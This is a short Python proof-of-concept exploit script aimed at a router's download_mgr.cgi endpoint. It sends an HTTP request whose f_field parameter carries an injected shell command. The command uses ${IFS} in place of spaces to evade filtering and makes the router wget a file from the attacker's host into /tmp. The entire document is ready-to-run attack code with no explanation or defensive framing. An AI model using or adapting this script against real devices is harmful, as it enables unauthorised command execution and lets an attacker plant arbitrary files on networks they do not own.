import requests
import sys

ROUTER_IP = "192.168.31.10"
MY_IP = "192.168.31.215"
MY_PORT = "8000"
FILE_NAME = "hack.txt"

def run_exploit():
    target_url = f"http://{ROUTER_IP}:80/cgi-bin/download_mgr.cgi"
    
    # 1. Prepare wget command (using ${IFS} instead of spaces)
    wget_cmd = f"wget${{IFS}}http://{MY_IP}:{MY_PORT}/{FILE_NAME}${{IFS}}-O${{IFS}}/tmp/{FILE_NAME}"
    
    # 2. Inject payload into f_field
    # curl ... f_field=x;ping...
    final_payload = f"x;{wget_cmd};#"
    
    # 3. Parameters for RSS_Item_List
    params = {
        'cmd': 'RSS_Item_List',
        'page': '1',
        'rp': '10',
        'f_field': final_payload
    }
    
    print("-" * 60)
    print(f"[*] Target: {target_url}")
    print(f"[*] Payload: {final_payload}")
    print("-" * 60)
    
    try:
        # Send payload
        requests.get(target_url, params=params, timeout=5)
        print("[+] Exploit sent successfully!")
    except Exception:
        print("[+] Exploit sent (check server logs)!")

if __name__ == "__main__":
    run_exploit()
